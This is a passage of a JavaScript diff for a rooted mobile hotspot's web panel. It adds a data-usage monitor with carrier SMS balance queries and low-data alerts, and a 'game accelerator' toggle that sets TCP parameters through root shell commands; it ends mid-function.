+                '<div style="padding:12px;margin-bottom:10px;border-radius:14px;background:linear-gradient(135deg,rgba(16,185,129,.1),rgba(59,130,246,.08));border:1px solid rgba(16,185,129,.2);">' +
+                    '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">' +
+                        '<div style="display:flex;align-items:center;gap:8px;">' +
+                            '<div style="width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#10b981,#059669);display:flex;align-items:center;justify-content:center;font-size:1rem;box-shadow:0 2px 8px rgba(16,185,129,.3);">📊</div>' +
+                            '<div>' +
+                                '<div style="font-size:.7rem;font-weight:bold;color:#10b981;">流量监控 · ' + _getCarrierName() + '</div>' +
+                                '<div style="font-size:.45rem;opacity:.5;">套餐: ' + totalGB + 'GB · 账单日: 每月' + _tcfg.cycleDay + '号</div>' +
+                            '</div>' +
+                        '</div>' +
+                        '<button id="traffic_settings_btn" style="font-size:.5rem;padding:4px 10px;border-radius:8px;border:1px solid rgba(16,185,129,.3);background:rgba(16,185,129,.1);color:#10b981;cursor:pointer;">⚙️ 设置</button>' +
+                    '</div>' +
+
+                    // 主进度条（美化版：大字号 + 加粗发光 + 百分比内嵌 + 告警刻度线）
+                    '<div style="margin-bottom:10px;">' +
+                        '<div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:6px;">' +
+                            '<span style="font-size:.95rem;font-weight:900;color:' + barColor + ';text-shadow:0 0 12px ' + barColor + '66;">' + usedGB.toFixed(2) + '<span style="font-size:.5rem;font-weight:700;opacity:.85;"> GB 已用</span></span>' +
+                            '<span style="font-size:.58rem;font-weight:700;opacity:.8;">剩余 <b style="color:' + barColor + ';font-size:.8rem;">' + leftGB.toFixed(2) + 'GB</b><span style="opacity:.6;"> / ' + totalGB + 'GB</span></span>' +
+                        '</div>' +
+                        '<div style="position:relative;height:22px;border-radius:11px;background:rgba(0,0,0,.3);overflow:hidden;border:1px solid rgba(255,255,255,.12);box-shadow:inset 0 2px 5px rgba(0,0,0,.5);">' +
+                            '<div style="height:100%;width:' + percent.toFixed(1) + '%;background:linear-gradient(90deg,' + barColor + 'bb,' + barColor + ',' + (percent > 70 ? '#ef4444' : '#3b82f6') + ');border-radius:11px;box-shadow:' + barGlow + ';transition:width .6s cubic-bezier(.4,0,.2,1);position:relative;overflow:hidden;">' +
+                                (percent > 8 ? '<div style="position:absolute;top:2px;left:8px;height:4px;width:calc(100% - 16px);border-radius:2px;background:rgba(255,255,255,.35);"></div>' : '') +
+                            '</div>' +
+                            (warnGB > 0 && warnGB < totalGB ? '<div style="position:absolute;left:' + warnPos.toFixed(1) + '%;top:-1px;bottom:-1px;width:2px;background:rgba(255,255,255,.65);box-shadow:0 0 5px rgba(255,255,255,.7);"></div>' : '') +
+                            '<div style="position:absolute;right:8px;top:50%;transform:translateY(-50%);font-size:.6rem;font-weight:900;color:#fff;text-shadow:0 1px 3px rgba(0,0,0,.95);letter-spacing:.5px;">' + percent.toFixed(1) + '%</div>' +
+                        '</div>' +
+                        '<div style="display:flex;justify-content:space-between;margin-top:3px;">' +
+                            '<span style="font-size:.45rem;opacity:.55;">📈 本月已用 ' + usedGB.toFixed(2) + 'GB</span>' +
+                            (leftGB <= warnGB
+                                ? '<span style="font-size:.48rem;color:#ef4444;font-weight:800;">⚠️ 已低于告警阈值（' + warnGB + 'GB）</span>'
+                                : '<span style="font-size:.45rem;opacity:.4;">┃ 告警线：剩余 ' + warnGB + 'GB</span>') +
+                        '</div>' +
+                    '</div>' +
+
+                    // 本月已用 + 告警阈值
+                    '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px;">' +
+                        '<div style="padding:8px;border-radius:10px;background:rgba(59,130,246,.08);text-align:center;border:1px solid rgba(59,130,246,.1);">' +
+                            '<div style="font-size:.4rem;opacity:.5;">本月已用</div>' +
+                            '<div style="font-size:.65rem;font-weight:bold;color:#60a5fa;">' + usedGB.toFixed(2) + 'GB</div>' +
+                        '</div>' +
+                        '<div style="padding:8px;border-radius:10px;background:rgba(245,158,11,.08);text-align:center;border:1px solid rgba(245,158,11,.1);">' +
+                            '<div style="font-size:.4rem;opacity:.5;">告警阈值</div>' +
+                            '<div style="font-size:.65rem;font-weight:bold;color:#f59e0b;">剩 ' + warnGB + 'GB</div>' +
+                        '</div>' +
+                    '</div>' +
+
+                    // 操作按钮
+                    '<div style="display:flex;gap:6px;margin-bottom:6px;">' +
+                        '<button id="traffic_refresh_btn" style="flex:1;font-size:.55rem;padding:6px 0;border-radius:8px;border:1px solid rgba(16,185,129,.3);background:rgba(16,185,129,.1);color:#10b981;cursor:pointer;">🔄 立即刷新</button>' +
+                        '<button id="traffic_query_sms_btn" style="flex:1;font-size:.55rem;padding:6px 0;border-radius:8px;border:1px solid rgba(59,130,246,.3);background:rgba(59,130,246,.1);color:#60a5fa;cursor:pointer;">📡 短信查流量</button>' +
+                    '</div>' +
+                    '<div style="display:flex;gap:6px;">' +
+                        '<button id="traffic_test_sms_btn" style="flex:1;font-size:.55rem;padding:6px 0;border-radius:8px;border:1px solid rgba(245,158,11,.3);background:rgba(245,158,11,.1);color:#f59e0b;cursor:pointer;">📱 测试短信</button>' +
+                        '<button id="traffic_reset_btn" style="flex:1;font-size:.55rem;padding:6px 0;border-radius:8px;border:1px solid rgba(239,68,68,.3);background:rgba(239,68,68,.1);color:#ef4444;cursor:pointer;">↺ 重置统计</button>' +
+                    '</div>' +
+
+                    // 告警状态
+                    (_tcfg.autoWarn && _tcfg.warnPhone
+                        ? '<div style="margin-top:8px;font-size:.45rem;color:#10b981;text-align:center;opacity:.7;">✅ 自动告警已开启 → ' + _tcfg.warnPhone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2') + '</div>'
+                        : '<div style="margin-top:8px;font-size:.45rem;color:#f59e0b;text-align:center;opacity:.7;">⚠️ 请在设置中配置告警手机号</div>') +
+                '</div>'
+
+            return html
+        }
+
+        var _updateTrafficUI = function() {
+            if (!_tPanel) return
+            _tPanel.innerHTML = _renderTrafficPanel()
+            _bindTrafficEvents()
+        }
+
+        var _bindTrafficEvents = function() {
+            var settingsBtn = document.getElementById('traffic_settings_btn')
+            if (settingsBtn) settingsBtn.onclick = _showTrafficSettings
+
+            var refreshBtn = document.getElementById('traffic_refresh_btn')
+            if (refreshBtn) refreshBtn.onclick = async function() {
+                refreshBtn.textContent = '刷新中...'
+                refreshBtn.disabled = true
+                await _updateTraffic()
+                _updateTrafficUI()
+                refreshBtn.textContent = '🔄 立即刷新'
+                refreshBtn.disabled = false
+                createToast('流量已刷新', 'green', 1500)
+            }
+
+            var testSmsBtn = document.getElementById('traffic_test_sms_btn')
+            if (testSmsBtn) testSmsBtn.onclick = async function() {
+                if (!_tcfg.warnPhone) {
+                    createToast('请先设置告警手机号', 'red', 2000)
+                    return
+                }
+                testSmsBtn.textContent = '发送中...'
+                testSmsBtn.disabled = true
+                var usedGB = (_tdata.monthUsedTotal / (1024*1024*1024)).toFixed(2)
+                var leftGB = Math.max(0, _tcfg.planTotal - parseFloat(usedGB)).toFixed(2)
+                var msg = '【流量测试】当前已用' + usedGB + 'GB，剩余' + leftGB + 'GB，套餐共' + _tcfg.planTotal + 'GB。短信功能正常。'
+                var res = await _sendSms(_tcfg.warnPhone, msg)
+                testSmsBtn.textContent = res.success ? '✅ 发送成功' : '❌ 发送失败'
+                setTimeout(function() {
+                    testSmsBtn.textContent = '📱 测试短信'
+                    testSmsBtn.disabled = false
+                }, 2000)
+            }
+
+            // 短信查流量【全自动/半自动】：优先 content query 读短信，AT 指令发查询
+            // - 全自动：AT 通道可用 → 自动发查询短信 + 自动读回复解析
+            // - 半自动：AT 通道不可用但 content query 可用 → 提示用户手动发查询，再点按钮读取解析
+            var querySmsBtn = document.getElementById('traffic_query_sms_btn')
+            if (querySmsBtn) querySmsBtn.onclick = async function() {
+                if (querySmsBtn.disabled) return
+                var carrierQuery = {
+                    mobile:  { num: '10086', cmd: 'CXLL', name: '中国移动' },
+                    unicom:  { num: '10010', cmd: 'CXLL', name: '中国联通' },
+                    telecom: { num: '10001', cmd: '108',  name: '中国电信' }
+                }
+                var q = carrierQuery[_tcfg.carrier]
+                if (!q) {
+                    createToast('请先在 ⚙️设置 中选择运营商（当前为自动/未识别）', 'red', 2500)
+                    return
+                }
+                querySmsBtn.disabled = true
+                try {
+                    // 第0步：环境自检（优先检测 content query 读短信能力，再检测 AT 发送能力）
+                    querySmsBtn.textContent = '🔍 自检中...'
+
+                    // 0a. 检测 content query 是否能读取短信（这是读取回复的核心能力）
+                    var contentSms = await _collectCarrierSmsViaContent()
+                    var canReadSms = contentSms && contentSms.length > 0
+
+                    // 0b. 检测 AT 通道是否可用（用于发送查询短信）
+                    _atProbeFailed = false
+                    var canSendSms = false
+                    var atChannelName = ''
+                    var envChk = await _t_rs('ls /data/data/com.minikano.f50_sms/files/ufi_req 2>/dev/null && echo UFI_OK || echo UFI_MISSING', 3000)
+                    if ((envChk.content || '').indexOf('UFI_OK') >= 0) {
+                        var foundHttp = await _probeAtServer()
+                        var foundSerial = foundHttp ? false : await _findAtSerialPort()
+                        if (foundHttp || foundSerial) {
+                            var atPing = await _readAtCmd('AT')
+                            canSendSms = atPing && atPing.indexOf('OK') >= 0
+                            if (canSendSms) {
+                                atChannelName = foundHttp ? _atBaseUrl : _atSerialPort
+                                addDiagLog('AT通道就绪：' + atChannelName, 'success')
+                            }
+                        }
+                    }
+                    // 如果 ufi_req 方式不行，尝试 service call 方式（展锐芯片）
+                    if (!canSendSms) {
+                        var hasSc = await _probeServiceCall()
+                        if (hasSc) {
+                            var scPing = await _readAtViaServiceCall('AT')
+                            canSendSms = scPing && scPing.indexOf('OK') >= 0
+                            if (canSendSms) {
+                                atChannelName = 'service call (' + _atServiceCallVersion + ')'
+                                addDiagLog('AT通道就绪：service call (' + _atServiceCallVersion + ')', 'success')
+                            }
+                        }
+                    }
+
+                    if (!canReadSms && !canSendSms) {
+                        querySmsBtn.textContent = '❌ 无可用通道'
+                        createToast('短信读取和发送通道都不可用，请检查 root 权限和短信权限', 'red', 5000)
+                        addDiagLog('短信查流量失败：content query 和 AT 通道均不可用', 'error')
+                        await _smsSleep(2500)
+                        return
+                    }
+
+                    var isManualMode = !canSendSms
+                    if (isManualMode) {
+                        // 半自动模式：AT 不可用但 content query 可用
+                        if (!confirm('AT 发送通道不可用，将使用「半自动模式」：\n\n请先手动向 ' + q.num + ' 发送短信 "' + q.cmd + '"，\n等收到运营商回复后，点击确定开始读取解析。\n\n（已通过系统短信数据库读取回复，更稳定）')) {
+                            querySmsBtn.textContent = '📡 短信查流量'
+                            querySmsBtn.disabled = false
+                            return
+                        }
+                    } else {
+                        addDiagLog('自检通过：content读短信=' + (canReadSms ? '✅' : '❌') + '，AT发短信=✅ (' + atChannelName + ')（全自动模式）', 'success')
+                    }
+
+                    // 第1步：读基线收件箱（记录已有短信和最大序号，避免把旧短信当新回复）
+                    querySmsBtn.textContent = '📡 准备中...'
+                    var baselineSms = await _collectCarrierSms()
+                    var baselineTexts = baselineSms.map(function(s) { return s.text })
+                    var baselineMaxIdx = 0
+                    for (var bi = 0; bi < baselineSms.length; bi++) {
+                        if (baselineSms[bi].index > baselineMaxIdx) baselineMaxIdx = baselineSms[bi].index
+                    }
+                    addDiagLog('短信查流量：基线 ' + baselineSms.length + ' 条，' + (isManualMode ? '半自动模式（手动发送）' : '向 ' + q.num + ' 发送 ' + q.cmd))
+
+                    // 第2步：发送查询短信（仅全自动模式）
+                    if (!isManualMode) {
+                        querySmsBtn.textContent = '📨 发送查询...'
+                        var res = await _sendSms(q.num, q.cmd)
+                        if (!res.success) {
+                            querySmsBtn.textContent = '❌ 发送失败'
+                            createToast('查询短信发送失败: ' + (res.msg || '') + '，可尝试手动发送后再点按钮读取', 'pink', 5000)
+                            addDiagLog('AT发送失败，建议手动发送后用 content query 读取解析', 'warn')
+                            await _smsSleep(2500)
+                            return
+                        }
+                    }
+
+                    // 第3步：轮询收件箱等运营商回复（每15秒读一次，最多5次共75秒）
+                    // 半自动模式下缩短轮询次数（用户已经发了，直接读）
+                    var maxRounds = isManualMode ? 1 : 5
+                    var waitSeconds = isManualMode ? 0 : 15
+                    for (var round = 1; round <= maxRounds; round++) {
+                        if (!isManualMode) {
+                            querySmsBtn.textContent = '⏳ 等回复(' + (round * 15) + '/75s)...'
+                            await _smsSleep(15000)
+                        } else {
+                            querySmsBtn.textContent = '🔍 读取解析中...'
+                        }
+                        var smsList = await _collectCarrierSms()
+                        // 找新短信：序号比基线大（运营商重发相同内容也能识别），或文本不在基线里
+                        var newSms = smsList.filter(function(s) {
+                            if (s.index > baselineMaxIdx && s.index > 0) return true
+                            return baselineTexts.indexOf(s.text) < 0
+                        })
+                        if (!newSms.length) continue
+
+                        // 第4步：解析流量数字
+                        querySmsBtn.textContent = '🔍 解析中...'
+                        var best = null
+                        for (var k = 0; k < newSms.length; k++) {
+                            var info = _parseTrafficFromSms(newSms[k].text)
+                            var score = (info.totalGB > 0 ? 2 : 0) + (info.leftGB > 0 ? 2 : 0) + (info.usedGB > 0 ? 1 : 0)
+                            if (!best || score > best.score) best = { info: info, score: score, text: newSms[k].text }
+                        }
+                        if (!best || best.score === 0) {
+                            addDiagLog('收到运营商新短信但未能解析出流量数字：' + (best ? best.text.substring(0, 60) : ''), 'warn')
+                            continue
+                        }
+
+                        // 第5步：应用到配置和统计，刷新进度条
+                        var info = best.info
+                        var GB = 1024 * 1024 * 1024
+                        if (info.totalGB > 0) _tcfg.planTotal = Math.round(info.totalGB * 10) / 10
+                        if (info.leftGB > 0 && info.totalGB > 0) {
+                            _tdata.monthUsedTotal = Math.max(0, (info.totalGB - info.leftGB)) * GB
+                        } else if (info.usedGB > 0) {
+                            _tdata.monthUsedTotal = info.usedGB * GB
+                        }
+                        _saveTCfg()
+                        _saveTData()
+                        _updateTrafficUI()
+                        querySmsBtn.textContent = '✅ 已同步'
+                        createToast('已同步运营商数据：套餐' + _tcfg.planTotal + 'GB，已用' + (_tdata.monthUsedTotal / GB).toFixed(2) + 'GB，剩余' + Math.max(0, _tcfg.planTotal - _tdata.monthUsedTotal / GB).toFixed(2) + 'GB', 'green', 5000)
+                        addDiagLog('流量同步成功（' + (isManualMode ? '半自动' : '全自动') + '）：' + best.text.substring(0, 80), 'success')
+                        await _smsSleep(2500)
+                        return
+                    }
+
+                    // 超时未读到回复
+                    if (isManualMode) {
+                        querySmsBtn.textContent = '⚠️ 未找到新短信'
+                        createToast('未在收件箱中找到新的运营商流量短信。请确认已发送查询并收到回复后再试', 'pink', 5000)
+                    } else {
+                        querySmsBtn.textContent = '⚠️ 未收到回复'
+                        createToast('75秒内未读到运营商回复。可能：1)回复延迟，稍后再点 2)短信读取受限（看诊断日志）', 'pink', 5000)
+                    }
+                    await _smsSleep(2500)
+                } catch(e) {
+                    querySmsBtn.textContent = '❌ 出错'
+                    createToast('查询流程异常: ' + (e.message || e), 'red', 3000)
+                    addDiagLog('查询流程异常: ' + (e.message || e), 'error')
+                    await _smsSleep(1500)
+                } finally {
+                    // 恢复按钮（否则点过一次就永久锁死无法再查）
+                    querySmsBtn.textContent = '📡 短信查流量'
+                    querySmsBtn.disabled = false
+                }
+            }
+
+            var resetBtn = document.getElementById('traffic_reset_btn')
+            if (resetBtn) resetBtn.onclick = function() {
+                if (confirm('确定要重置本月流量统计吗？')) {
+                    _tdata.monthUsedTx = 0
+                    _tdata.monthUsedRx = 0
+                    _tdata.monthUsedTotal = 0
+                    _tdata.todayUsed = 0
+                    _tcfg.lastWarnMonth = ''
+                    _saveTData()
+                    _saveTCfg()
+                    _updateTrafficUI()
+                    createToast('已重置流量统计', 'green', 1500)
+                }
+            }
+        }
+
+        // ---- 设置面板 ----
+        // 修复：原代码调用 createModal('标题', html) 传参签名错误（平台API要求对象参数），
+        // 导致点击设置按钮直接报错弹窗打不开。改用与限速器相同的原生DOM弹窗（已验证可用）。
+        var _showTrafficSettings = function() {
+            var html =
+                '<div style="min-width:280px;">' +
+
+                    // 运营商选择
+                    '<div style="margin-bottom:12px;">' +
+                        '<label style="font-size:.6rem;opacity:.7;display:block;margin-bottom:4px;">运营商</label>' +
+                        '<select id="tcfg_carrier" style="width:100%;padding:6px 8px;border-radius:6px;border:1px solid rgba(255,255,255,.2);background:rgba(0,0,0,.3);color:white;font-size:.6rem;">' +
+                            '<option value="auto"' + (_tcfg.carrier === 'auto' ? ' selected' : '') + '>自动识别</option>' +
+                            '<option value="mobile"' + (_tcfg.carrier === 'mobile' ? ' selected' : '') + '>中国移动</option>' +
+                            '<option value="unicom"' + (_tcfg.carrier === 'unicom' ? ' selected' : '') + '>中国联通</option>' +
+                            '<option value="telecom"' + (_tcfg.carrier === 'telecom' ? ' selected' : '') + '>中国电信</option>' +
+                        '</select>' +
+                    '</div>' +
+
+                    // 套餐总量
+                    '<div style="margin-bottom:12px;">' +
+                        '<label style="font-size:.6rem;opacity:.7;display:block;margin-bottom:4px;">月套餐总量 (GB)</label>' +
+                        '<input type="number" id="tcfg_total" value="' + _tcfg.planTotal + '" min="1" step="1" style="width:100%;padding:6px 8px;border-radius:6px;border:1px solid rgba(255,255,255,.2);background:rgba(0,0,0,.3);color:white;font-size:.6rem;">' +
+                    '</div>' +
+
+                    // 账单日
+                    '<div style="margin-bottom:12px;">' +
+                        '<label style="font-size:.6rem;opacity:.7;display:block;margin-bottom:4px;">每月账单日</label>' +
+                        '<input type="number" id="tcfg_cycle" value="' + _tcfg.cycleDay + '" min="1" max="28" step="1" style="width:100%;padding:6px 8px;border-radius:6px;border:1px solid rgba(255,255,255,.2);background:rgba(0,0,0,.3);color:white;font-size:.6rem;">' +
+                        '<div style="font-size:.45rem;opacity:.4;margin-top:2px;">每月这一天重置流量统计</div>' +
+                    '</div>' +
+
+                    // 告警阈值
+                    '<div style="margin-bottom:12px;">' +
+                        '<label style="font-size:.6rem;opacity:.7;display:block;margin-bottom:4px;">剩余流量告警阈值 (GB)</label>' +
+                        '<input type="number" id="tcfg_threshold" value="' + _tcfg.warnThreshold + '" min="0" step="0.5" style="width:100%;padding:6px 8px;border-radius:6px;border:1px solid rgba(255,255,255,.2);background:rgba(0,0,0,.3);color:white;font-size:.6rem;">' +
+                        '<div style="font-size:.45rem;opacity:.4;margin-top:2px;">剩余流量低于此值时发送短信告警</div>' +
+                    '</div>' +
+
+                    // 告警手机号
+                    '<div style="margin-bottom:12px;">' +
+                        '<label style="font-size:.6rem;opacity:.7;display:block;margin-bottom:4px;">告警接收手机号</label>' +
+                        '<input type="tel" id="tcfg_phone" value="' + _tcfg.warnPhone + '" placeholder="请输入手机号" style="width:100%;padding:6px 8px;border-radius:6px;border:1px solid rgba(255,255,255,.2);background:rgba(0,0,0,.3);color:white;font-size:.6rem;">' +
+                    '</div>' +
+
+                    // 告警短信内容
+                    '<div style="margin-bottom:12px;">' +
+                        '<label style="font-size:.6rem;opacity:.7;display:block;margin-bottom:4px;">短信内容模板</label>' +
+                        '<textarea id="tcfg_message" rows="3" style="width:100%;padding:6px 8px;border-radius:6px;border:1px solid rgba(255,255,255,.2);background:rgba(0,0,0,.3);color:white;font-size:.55rem;resize:vertical;">' + _tcfg.warnMessage + '</textarea>' +
+                        '<div style="font-size:.4rem;opacity:.4;margin-top:2px;">可用变量: {used}已用 {left}剩余 {total}总量 {date}日期</div>' +
+                    '</div>' +
+
+                    // 自动告警开关
+                    '<div style="margin-bottom:16px;display:flex;align-items:center;justify-content:space-between;">' +
+                        '<label style="font-size:.6rem;opacity:.7;">开启自动短信告警</label>' +
+                        '<label style="position:relative;display:inline-block;width:40px;height:20px;">' +
+                            '<input type="checkbox" id="tcfg_autowarn" ' + (_tcfg.autoWarn ? 'checked' : '') + ' style="opacity:0;width:0;height:0;">' +
+                            '<span style="position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background-color:#ccc;border-radius:20px;transition:.3s;' + (_tcfg.autoWarn ? 'background-color:#10b981;' : '') + '">' +
+                                '<span style="position:absolute;content:\'\';height:16px;width:16px;left:2px;bottom:2px;background-color:white;border-radius:50%;transition:.3s;' + (_tcfg.autoWarn ? 'transform:translateX(20px);' : '') + '"></span>' +
+                            '</span>' +
+                        '</label>' +
+                    '</div>' +
+
+                    // 保存按钮
+                    '<button id="tcfg_save_btn" style="width:100%;padding:8px;border-radius:8px;border:none;background:linear-gradient(135deg,#10b981,#059669);color:white;font-weight:bold;cursor:pointer;font-size:.65rem;">💾 保存设置</button>' +
+                '</div>'
+
+            // 创建弹窗（原生DOM，样式与限速器弹窗一致）
+            var overlay = document.createElement('div')
+            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:99999;display:flex;align-items:center;justify-content:center;'
+            overlay.id = 'traffic_settings_overlay'
+
+            var modal = document.createElement('div')
+            modal.style.cssText = 'background:#15171f;border:1px solid #334155;border-radius:16px;padding:20px;width:90%;max-width:420px;max-height:80vh;overflow-y:auto;'
+            modal.innerHTML = '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;">'
+                + '<div style="font-size:.82rem;font-weight:700;color:#10b981;">📊 流量监控设置</div>'
+                + '<span id="tcfg_close" style="color:#64748b;cursor:pointer;font-size:1rem;">✕</span>'
+                + '</div>' + html
+
+            overlay.appendChild(modal)
+            document.body.appendChild(overlay)
+
+            // 关闭
+            modal.querySelector('#tcfg_close').onclick = function() {
+                if (document.getElementById('traffic_settings_overlay')) document.body.removeChild(overlay)
+            }
+            overlay.onclick = function(e) { if (e.target === overlay) document.body.removeChild(overlay) }
+
+            // 自动告警开关的视觉联动（原代码点了不变色）
+            var autoWarnInput = modal.querySelector('#tcfg_autowarn')
+            if (autoWarnInput) autoWarnInput.addEventListener('change', function() {
+                var slider = this.nextElementSibling
+                var knob = slider ? slider.firstElementChild : null
+                if (slider) slider.style.backgroundColor = this.checked ? '#10b981' : '#ccc'
+                if (knob) knob.style.transform = this.checked ? 'translateX(20px)' : 'translateX(0)'
+            })
+
+            // 绑定事件
+            var saveBtn = modal.querySelector('#tcfg_save_btn')
+            if (saveBtn) saveBtn.onclick = function() {
+                var carrier = modal.querySelector('#tcfg_carrier').value
+                var total = parseFloat(modal.querySelector('#tcfg_total').value) || 30
+                var cycle = parseInt(modal.querySelector('#tcfg_cycle').value) || 1
+                var threshold = parseFloat(modal.querySelector('#tcfg_threshold').value) || 5
+                var phone = modal.querySelector('#tcfg_phone').value.trim()
+                var message = modal.querySelector('#tcfg_message').value.trim()
+                var autoWarn = modal.querySelector('#tcfg_autowarn').checked
+
+                if (cycle < 1) cycle = 1
+                if (cycle > 28) cycle = 28
+
+                _tcfg.carrier = carrier
+                _tcfg.planTotal = total
+                _tcfg.cycleDay = cycle
+                _tcfg.warnThreshold = threshold
+                _tcfg.warnPhone = phone
+                _tcfg.warnMessage = message || '【流量告警】您的剩余流量已不足{left}GB，本月已用{used}GB，套餐共{total}GB。'
+                _tcfg.autoWarn = autoWarn
+
+                _saveTCfg()
+                _updateTrafficUI()
+                if (document.getElementById('traffic_settings_overlay')) document.body.removeChild(overlay)
+                createToast('设置已保存', 'green', 1500)
+            }
+
+            addDiagLog('流量监控设置面板已打开', 'success')
+        }
+
+        // ---- 初始化 ----
+        var _trafficTimer = null
+
+        var _initTrafficMonitor = async function() {
+            // 自动识别运营商
+            if (_tcfg.carrier === 'auto') {
+                var detected = await _detectCarrier()
+                if (detected !== 'auto') {
+                    _tcfg.carrier = detected
+                    _saveTCfg()
+                }
+            }
+
+            // 首次更新
+            await _updateTraffic()
+
+            // 每30分钟检查一次
+            if (_trafficTimer) clearInterval(_trafficTimer)
+            _trafficTimer = setInterval(function() { _updateTraffic() }, 30 * 60 * 1000)
+        }
+
+        // 创建面板容器
+        var tContainer = document.querySelector('.functions-container') || document.body
+        var tWrap = document.createElement('div')
+        tWrap.id = 'traffic_monitor_wrap'
+        tWrap.style.cssText = 'width:100%;margin-top:8px;'
+        tWrap.innerHTML = _renderTrafficPanel()
+        _tPanel = tWrap
+
+        // 插入到智能设备管理器面板的按钮区下方
+        var actionBox = document.querySelector('#SMART_action_box')
+        if (actionBox && actionBox.parentNode) {
+            actionBox.parentNode.insertBefore(tWrap, actionBox.nextSibling)
+        } else {
+            mmContainer.insertAdjacentElement('afterend', tWrap)
+        }
+
+        _bindTrafficEvents()
+
+        // 延迟启动监控，避免阻塞
+        setTimeout(function() {
+            _initTrafficMonitor()
+            addDiagLog('流量监控模块已加载 (' + _getCarrierName() + ')', 'success')
+        }, 800)
+
+    })()
+    }, 500);
+
+    // ============ 游戏加速器开关（已收进工具栏按钮区） ============
+    ;(() => {
+        // ---- 工具栏按钮状态CSS ----
+        var _fbStyle = document.createElement('style')
+        _fbStyle.textContent = `
+        /* 工具栏「游戏加速」按钮开启态 */
+        .smart_action_btn._tb-boost-on {
+            background: linear-gradient(135deg,#16a34a,#22c55e) !important;
+            border-color: rgba(74,222,128,.7) !important;
+            box-shadow: 0 0 10px rgba(34,197,94,.35);
+        }
+        `
+        document.head.appendChild(_fbStyle)
+
+        // ---- 工具栏「🎮 游戏加速」开关按钮（原屏幕右下角圆形按钮，已收进工具栏） ----
+        var _gbBtn = document.createElement('button')
+        _gbBtn.id = '_smart_game_btn'
+        _gbBtn.className = 'smart_action_btn'
+        _gbBtn.style.cssText = 'font-size:.55rem;padding:8px 16px;background:linear-gradient(135deg,#ef4444,#b91c1c);color:white;border:1px solid rgba(248,113,113,.4);'
+
+        // 恢复保存的状态
+        var _gbEnabled = false
+        try { _gbEnabled = localStorage.getItem('_game_boost_manual') === '1' } catch(e) {}
+        if (_gbEnabled) {
+            _gbBtn.classList.add('_tb-boost-on')
+            _gbBtn.textContent = '🎮 加速中'
+        } else {
+            _gbBtn.textContent = '🎮 加速关闭'
+        }
+        actionBox.appendChild(_gbBtn)
+
+        _gbBtn.onclick = async function() {
+            _gbEnabled = !_gbEnabled
+            try { localStorage.setItem('_game_boost_manual', _gbEnabled ? '1' : '0') } catch(e) {}
+
+            if (_gbEnabled) {
+                _gbBtn.classList.add('_tb-boost-on')
+                _gbBtn.textContent = '🎮 加速中'
+                createToast('游戏加速器已开启', 'green', 2500)
+
+                // 应用加速参数
+                try {
+                    await runShellWithRoot(
+                        'echo 1 > /proc/sys/net/ipv4/tcp_low_latency 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_no_metrics_save 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse 2>/dev/null;' +
+                        'echo "4096 425984 16777216" > /proc/sys/net/ipv4/tcp_rmem 2>/dev/null;' +
+                        'echo "4096 425984 16777216" > /proc/sys/net/ipv4/tcp_wmem 2>/dev/null;' +
+                        'echo 425984 > /proc/sys/net/core/rmem_default 2>/dev/null;' +
+                        'echo 425984 > /proc/sys/net/core/wmem_default 2>/dev/null;' +
+                        'echo 16777216 > /proc/sys/net/core/rmem_max 2>/dev/null;' +
+                        'echo 16777216 > /proc/sys/net/core/wmem_max 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_window_scaling 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_moderate_rcvbuf 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_adv_win_scale 2>/dev/null;' +
+                        'echo 3 > /proc/sys/net/ipv4/tcp_fastopen 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_mtu_probing 2>/dev/null;' +
+                        'echo 15 > /proc/sys/net/ipv4/tcp_retries2 2>/dev/null;' +
+                        'echo 0 > /proc/sys/net/ipv4/tcp_slow_start_after_idle 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_no_ssthresh_metrics_save 2>/dev/null;' +
+                        'echo "bbr" > /proc/sys/net/ipv4/tcp_congestion_control 2>/dev/null;' +
+                        'echo "fq_codel" > /proc/sys/net/core/default_qdisc 2>/dev/null;' +
+                        'echo 10000 > /proc/sys/net/core/netdev_max_backlog 2>/dev/null;' +
+                        'echo 8192 > /proc/sys/net/core/netdev_budget 2>/dev/null;' +
+                        'echo 20000 > /proc/sys/net/core/netdev_budget_usecs 2>/dev/null;' +
+                        'echo 8192 > /proc/sys/net/core/somaxconn 2>/dev/null;' +
+                        'echo 8192 > /proc/sys/net/ipv4/tcp_max_syn_backlog 2>/dev/null;' +
+                        'echo "1024 65535" > /proc/sys/net/ipv4/ip_local_port_range 2>/dev/null;' +
+                        'echo 32768 > /proc/sys/net/ipv4/tcp_max_orphans 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_rfc1337 2>/dev/null;' +
+                        'echo 1 > /proc/sys/net/ipv4/tcp_ecn 2>/dev/null;' +
+                        'echo BOOST_ON'
+                    )
+                    GAME_BOOST_ENABLED = true
+                    if (!GAME_MONITOR_INTERVAL) {
+                        gameMonitorLoop()
+                        GAME_MONITOR_INTERVAL = requestInterval(function() { gameMonitorLoop() }, 3000)
+                    }
+                    addDiagLog('游戏加速器手动开启: BBR+16M缓冲区', 'success')
+                } catch(e) {
+                    createToast('加速器开启失败: ' + String(e), 'red')
+                    addDiagLog('加速器开启异常: ' + String(e), 'error')
+                }
+            } else {
+                _gbBtn.classList.remove('_tb-boost-on')
+                _gbBtn.textContent = '🎮 加速关闭'
+                createToast('游戏加速器已关闭，正在还原网络参数...', '', 2500)
+
+                GAME_BOOST_ENABLED = false
+                // 无论是否在游戏中，都停止监控循环
+                if (GAME_MONITOR_INTERVAL) {
+                    try { GAME_MONITOR_INTERVAL() } catch(e) {}
+                    GAME_MONITOR_INTERVAL = null
+                }
+                // 若正处于游戏加速会话中，复位会话状态
+                if (GAME_BOOST_ACTIVE) {
